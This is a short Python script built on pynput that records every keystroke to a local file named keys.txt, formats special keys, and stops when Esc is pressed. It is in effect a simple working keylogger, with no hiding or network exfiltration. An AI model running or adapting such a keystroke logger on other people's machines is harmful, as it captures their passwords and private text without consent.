from pynput import keyboard
import pynput

keys = []


def strip_apostrophe(key):
    return str(key).replace("'", "")


def format_modifier_key(key):
    key = strip_apostrophe(key)
    key = key.replace("Key.", "")
    return f"[{key}]"


def format_special_key(key):
    if (key == keyboard.Key.space):
        return " "
    elif (key == keyboard.Key.enter):
        return "\n"
    elif (key == keyboard.Key.esc):
        return ""

    # If the input is an invisible modifier key (e.g. Shift, Alt)
    # surrond it with brackets.
    return format_modifier_key(key)


def format_key(key):
    if (type(key) != pynput.keyboard.KeyCode):
        return format_special_key(key)
    return strip_apostrophe(key)


def write_to_file(keys):
    with open('keys.txt', 'w') as file:
        for key in keys:
            file.write(format_key(key))


# Boilerplate from pynput docs
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard

def on_press(key):
    keys.append(key)
    write_to_file(keys)


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
